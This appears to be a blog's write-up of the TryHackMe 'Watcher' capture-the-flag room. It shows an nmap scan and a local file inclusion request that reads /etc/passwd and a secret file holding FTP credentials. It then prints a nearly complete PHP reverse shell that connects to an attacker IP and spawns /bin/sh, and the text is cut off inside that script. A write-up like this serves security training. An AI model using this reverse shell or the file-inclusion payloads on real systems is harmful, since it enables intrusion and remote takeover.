<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  
    <meta name="pv-cache-enabled" content="false">

    
  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Tryhackme Watcher" />
<meta name="author" content="Razor-Sec" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room here" />
<meta property="og:description" content="Introduction This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room here" />
<link rel="canonical" href="/posts/writeup-tryhackme-watcher/" />
<meta property="og:url" content="/posts/writeup-tryhackme-watcher/" />
<meta property="og:site_name" content="Razor-Sec" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-02-20T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Tryhackme Watcher" />
<meta name="twitter:site" content="@0xrxd" />
<meta name="twitter:creator" content="@Razor-Sec" />
<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
<script type="application/ld+json">
{"description":"Introduction This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room here","@type":"BlogPosting","headline":"Tryhackme Watcher","dateModified":"2021-02-20T00:00:00+07:00","datePublished":"2021-02-20T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-tryhackme-watcher/"},"author":{"@type":"Person","name":"Razor-Sec"},"url":"/posts/writeup-tryhackme-watcher/","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Tryhackme Watcher | Razor-Sec
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://www.favicon-generator.org/
-->



<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">

<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png">

<link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/favicons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

<link rel="manifest" href="/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
    integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">

  <!-- Font Awesome -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
    integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ="
    crossorigin="anonymous">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/p.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Razor-Sec</a>
    </div>

    <div class="site-subtitle font-italic">Some writeup about cyber security</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Razor-Sec" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/0xrxd" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['markoyanfyan12','gmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="https://www.linkedin.com/in/afriansyah/" aria-label="linkedin"
        class="order-6"
        target="_blank" rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
        <span>
          
          
          <a href="/">
            Posts
          </a>
        </span>

        

      

        
          <span>Tryhackme Watcher</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
  
  

  

  



<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Tryhackme Watcher</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <!--
  Date format snippet
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, Feb 20, 2021, 12:00 AM +0700"
  >

  
  

  
    Feb 20
  

  <i class="unloaded">2021-02-20T00:00:00+07:00</i>

</span>

          by
          <span class="author">
            Razor-Sec
          </span>
        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1407 words">7 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        
          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg.png" class="preview-img" alt="image alternative text">
        

        <h2 id="introduction">Introduction</h2>
<p>This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room <a href="https://tryhackme.com/room/watcher">here</a></p>

<h2 id="scanning">Scanning</h2>

<h3 id="nmap">Nmap</h3>

<p>First time we have to do is scanning the Machine :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>nmap 10.10.35.205 <span class="nt">-sC</span> <span class="nt">-sV</span>
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-20 23:42 WIB
Nmap scan report <span class="k">for </span>10.10.35.205
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 <span class="o">(</span>RSA<span class="o">)</span>
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>34.71 seconds


</pre></td></tr></tbody></table></code></div></div>

<p>From the results of nmap we know there are 3 open ports including ftp, ssh, and webserver. Now let’s take a look the webserver :
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_1.png" alt="img" /></p>

<h2 id="getting-user">Getting User</h2>

<p>First i’m going to robots.txt, and i found this :</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_2.png" alt="img" /></p>

<p>Now lets looking at flag_1.txt.</p>

<h3 id="flag-1">Flag 1</h3>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_3.png" alt="img" /></p>

<p>Then we got first flag. now lets see the content of the webserver.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_4.png" alt="img" /></p>

<p>As you can see there is maybe php runs a script which displays a file. and i trying File Inclusion then change striped.php to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. From <code class="language-plaintext highlighter-rouge">http://10.10.35.205/post.php?post=striped.php</code> to <code class="language-plaintext highlighter-rouge">http://10.10.35.205/post.php?post=/etc/passwd</code>.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_5.png" alt="img" /></p>

<p>Then its works!!. Now lets see the secret file <code class="language-plaintext highlighter-rouge">/secret_file_do_not_read.txt</code> in <code class="language-plaintext highlighter-rouge">http://10.10.35.205/post.php?post=/secret_file_do_not_read.txt</code>.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_6.png" alt="img" /></p>

<p>And We found credentials of the ftp!, let’s check the ftp user .</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_7.png" alt="img" /></p>

<h3 id="flag-2">Flag 2</h3>

<p>As you can see we found flag_2.txt and get it.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ cat flag_2.txt              
FLAG{f------------e}
</pre></td></tr></tbody></table></code></div></div>
<p>Now as you can see in ftp there is have files which is can be uploaded. then i want try to upload php-revershell.php from pentest monkey which contain :</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
</pre></td><td class="rouge-code"><pre><span class="o">&lt;?</span><span class="kd">php</span>

<span class="kd">set_time_limit</span> <span class="o">(</span><span class="m">0</span><span class="o">);</span>
$VERSION <span class="o">=</span> <span class="s2">"1.0"</span><span class="o">;</span>
$ip <span class="o">=</span> <span class="s1">'10.2.47.251'</span><span class="o">;</span>  // <span class="kd">CHANGE</span> <span class="kd">THIS</span>
$port <span class="o">=</span> <span class="m">4444</span><span class="o">;</span>       // <span class="kd">CHANGE</span> <span class="kd">THIS</span>
$chunk_size <span class="o">=</span> <span class="m">1400</span><span class="o">;</span>
$write_a <span class="o">=</span> <span class="kd">null</span><span class="o">;</span>
$error_a <span class="o">=</span> <span class="kd">null</span><span class="o">;</span>
$shell <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="o">;</span>
$daemon <span class="o">=</span> <span class="m">0</span><span class="o">;</span>
$debug <span class="o">=</span> <span class="m">0</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(</span><span class="kd">function_exists</span><span class="o">(</span><span class="s1">'pcntl_fork'</span><span class="o">))</span> <span class="o">{</span>
        // <span class="kd">Fork</span> <span class="kd">and</span> <span class="kd">have</span> <span class="kd">the</span> <span class="kd">parent</span> <span class="kd">process</span> <span class="k">exit</span>
        $pid <span class="o">=</span> <span class="kd">pcntl_fork</span><span class="o">();</span>

        <span class="k">if</span> <span class="o">(</span>$pid <span class="o">==</span> <span class="o">-</span><span class="m">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="kd">printit</span><span class="o">(</span><span class="s2">"ERROR: Can't fork"</span><span class="o">);</span>
                <span class="k">exit</span><span class="o">(</span><span class="m">1</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span>$pid<span class="o">)</span> <span class="o">{</span>
                <span class="k">exit</span><span class="o">(</span><span class="m">0</span><span class="o">);</span>  // <span class="kd">Parent</span> <span class="kd">exits</span>
        <span class="o">}</span>

        // <span class="kd">Make</span> <span class="kd">the</span> <span class="kd">current</span> <span class="kd">process</span> <span class="kd">a</span> <span class="kd">session</span> <span class="kd">leader</span>
        // <span class="kd">Will</span> <span class="kd">only</span> <span class="kd">succeed</span> <span class="k">if</span> <span class="kd">we</span> <span class="kd">forked</span>
        <span class="k">if</span> <span class="o">(</span><span class="kd">posix_setsid</span><span class="o">()</span> <span class="o">==</span> <span class="o">-</span><span class="m">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="kd">printit</span><span class="o">(</span><span class="s2">"Error: Can't setsid()"</span><span class="o">);</span>
                <span class="k">exit</span><span class="o">(</span><span class="m">1</span><span class="o">);</span>
        <span class="o">}</span>

        $daemon <span class="o">=</span> <span class="m">1</span><span class="o">;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="kd">printit</span><span class="o">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="o">);</span>
<span class="o">}</span>

// <span class="kd">Change</span> <span class="kd">to</span> <span class="kd">a</span> <span class="kd">safe</span> <span class="kd">directory</span>
<span class="nb">chdir</span><span class="o">(</span><span class="s2">"/"</span><span class="o">);</span>

// <span class="kd">Remove</span> <span class="kd">any</span> <span class="kd">umask</span> <span class="kd">we</span> <span class="kd">inherited</span>
<span class="kd">umask</span><span class="o">(</span><span class="m">0</span><span class="o">);</span>

//
// <span class="kd">Do</span> <span class="kd">the</span> <span class="kd">reverse</span> <span class="kd">shell</span>...
//

// <span class="kd">Open</span> <span class="kd">reverse</span> <span class="kd">connection</span>
$sock <span class="o">=</span> <span class="kd">fsockopen</span><span class="o">(</span>$ip<span class="o">,</span> $port<span class="o">,</span> $errno<span class="o">,</span> $errstr<span class="o">,</span> <span class="m">30</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(</span><span class="err">!</span>$sock<span class="o">)</span> <span class="o">{</span>
        <span class="kd">printit</span><span class="o">(</span><span class="s2">"$errstr ($errno)"</span><span class="o">);</span>
        <span class="k">exit</span><span class="o">(</span><span class="m">1</span><span class="o">);</span>
<span class="o">}</span>

// <span class="kd">Spawn</span> <span class="kd">shell</span> <span class="kd">process</span>
$descriptorspec <span class="o">=</span> <span class="kd">array</span><span class="o">(</span>
   <span class="m">0</span> <span class="o">=&gt;</span> <span class="kd">array</span><span class="o">(</span><span class="s2">"pipe"</span><span class="o">,</span> <span class="s2">"r"</span><span class="o">),</span>  // <span class="kd">stdin</span> <span class="kd">is</span> <span class="kd">a</span> <span class="kd">pipe</span> <span class="kd">that</span> <span class="kd">the</span> <span class="kd">child</span> <span class="kd">will</span> <span class="kd">read</span> <span class="kd">from</span>
   <span class="m">1</span> <span class="o">=&gt;</span> <span class="kd">array</span><span class="o">(</span><span class="s2">"pipe"</span><span class="o">,</span> <span class="s2">"w"</span><span class="o">),</span>  // <span class="kd">stdout</span> <span class="kd">is</span> <span class="kd">a</span> <span class="kd">pipe</span> <span class="kd">that</span> <span class="kd">the</span> <span class="kd">child</span> <span class="kd">will</span> <span class="kd">write</span> <span class="kd">to</span>
   <span class="m">2</span> <span class="o">=&gt;</span> <span class="kd">array</span><span class="o">(</span><span class="s2">"pipe"</span><span class="o">,</span> <span class="s2">"w"</span><span class="o">)</span>   // <span class="kd">stderr</span> <span class="kd">is</span> <span class="kd">a</span> <span class="kd">pipe</span> <span class="kd">that</span> <span class="kd">the</span> <span class="kd">child</span> <span class="kd">will</span> <span class="kd">write</span> <span class="kd">to</span>
<span class="o">);</span>

$process <span class="o">=</span> <span class="kd">proc_open</span><span class="o">(</span>$shell<span class="o">,</span> $descriptorspec<span class="o">,</span> $pipes<span class="o">);</span>

<span class="k">if</span> <span class="o">(</span><span class="err">!</span><span class="kd">is_resource</span><span class="o">(</span>$process<span class="o">))</span> <span class="o">{</span>
        <span class="kd">printit</span><span class="o">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="o">);</span>
        <span class="k">exit</span><span class="o">(</span><span class="m">1</span><span class="o">);</span>
<span class="o">}</span>

// <span class="kd">Set</span> <span class="kd">everything</span> <span class="kd">to</span> <span class="kd">non</span><span class="na">-blocking
</span>// <span class="kd">Reason</span>: <span class="kd">Occsionally</span> <span class="kd">reads</span> <span class="kd">will</span> <span class="kd">block</span><span class="o">,</span> <span class="kd">even</span> <span class="kd">though</span> <span class="kd">stream_select</span> <span class="kd">tells</span> <span class="kd">us</span> <span class="kd">they</span> <span class="kd">won</span><span class="s1">'t
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process'</span><span class="kd">s</span> <span class="kd">STDIN</span>
        <span class="k">if</span> <span class="o">(</span><span class="kd">in_array</span><span class="o">(</span>$sock<span class="o">,</span> $read_a<span class="o">))</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span>$debug<span class="o">)</span> <span class="kd">printit</span><span class="o">(</span><span class="s2">"SOCK READ"</span><span class="o">);</span>
                $input <span class="o">=</span> <span class="kd">fread</span><span class="o">(</span>$sock<span class="o">,</span> $chunk_size<span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span>$debug<span class="o">)</span> <span class="kd">printit</span><span class="o">(</span><span class="s2">"SOCK: $input"</span><span class="o">);</span>
                <span class="kd">fwrite</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">0</span><span class="o">],</span> $input<span class="o">);</span>
        <span class="o">}</span>

        // <span class="kd">If</span> <span class="kd">we</span> <span class="kd">can</span> <span class="kd">read</span> <span class="kd">from</span> <span class="kd">the</span> <span class="kd">process</span><span class="s1">'s STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process'</span><span class="kd">s</span> <span class="kd">STDERR</span>
        // <span class="kd">send</span> <span class="kd">data</span> <span class="kd">down</span> <span class="kd">tcp</span> <span class="kd">connection</span>
        <span class="k">if</span> <span class="o">(</span><span class="kd">in_array</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">2</span><span class="o">],</span> $read_a<span class="o">))</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span>$debug<span class="o">)</span> <span class="kd">printit</span><span class="o">(</span><span class="s2">"STDERR READ"</span><span class="o">);</span>
                $input <span class="o">=</span> <span class="kd">fread</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">2</span><span class="o">],</span> $chunk_size<span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span>$debug<span class="o">)</span> <span class="kd">printit</span><span class="o">(</span><span class="s2">"STDERR: $input"</span><span class="o">);</span>
                <span class="kd">fwrite</span><span class="o">(</span>$sock<span class="o">,</span> $input<span class="o">);</span>
        <span class="o">}</span>
<span class="o">}</span>

<span class="kd">fclose</span><span class="o">(</span>$sock<span class="o">);</span>
<span class="kd">fclose</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">0</span><span class="o">]);</span>
<span class="kd">fclose</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">1</span><span class="o">]);</span>
<span class="kd">fclose</span><span class="o">(</span>$pipes<span class="o">[</span><span class="m">2</span><span class="o">]);</span>
<span class="kd">proc_close</span><span class="o">(</span>$process<span class="o">);</span>

// <span class="kd">Like</span> <span class="nb">print</span><span class="o">,</span> <span class="kd">but</span> <span class="kd">does</span> <span class="kd">nothing</span> <span class="k">if</span> <span class="kd">we</span><span class="s1">'ve daemonised ourself
// (I can'</span><span class="kd">t</span> <span class="kd">figure</span> <span class="kd">out</span> <span class="kd">how</span> <span class="kd">to</span> <span class="kd">redirect</span> <span class="kd">STDOUT</span> <span class="kd">like</span> <span class="kd">a</span> <span class="kd">proper</span> <span class="kd">daemon</span><span class="o">)</span>
